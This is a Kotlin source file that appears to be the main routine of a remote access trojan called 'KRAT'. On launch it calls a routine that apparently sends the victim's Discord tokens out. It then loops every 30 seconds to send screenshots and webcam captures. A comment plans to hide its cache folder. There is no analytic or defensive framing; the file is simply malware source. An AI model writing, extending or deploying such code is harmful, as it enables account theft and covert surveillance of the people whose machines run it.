import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import services.Discord
import java.io.File

object KRAT {
    val user: String = System.getProperty("user.name")
    val cacheDir: File = // Right now, uses downloads folder, TODO: make it hidden
        if (System.getProperty("os.name").contains("windows", true))
            File("C:\\Users\\$user\\Downloads") // C:/Users/${user}/AppData/Local/Temp"
        else
            File("/home")
}

fun main() {
    websocket.main() // stats application

    Discord.sendTokens()

    val scope = CoroutineScope(Dispatchers.Default)

    scope.launch {
        while (isActive) {
            Screen.sendScreenshot()
            Screen.sendWebcam()
            delay(30_000)
        }
    }

//    coroutineScope.cancel()

    /*SystemWatcher(Paths.get("C:/Users/${.Main.user}/Downloads"), recursive = true).apply {
        on<.SystemEvent.Created> { println("Created: ${it.path}") }
        on<.SystemEvent.Modified> { println("Modified: ${it.path}") }
        on<.SystemEvent.Deleted> { println("Deleted: ${it.path}") }

        start()
    }*/


}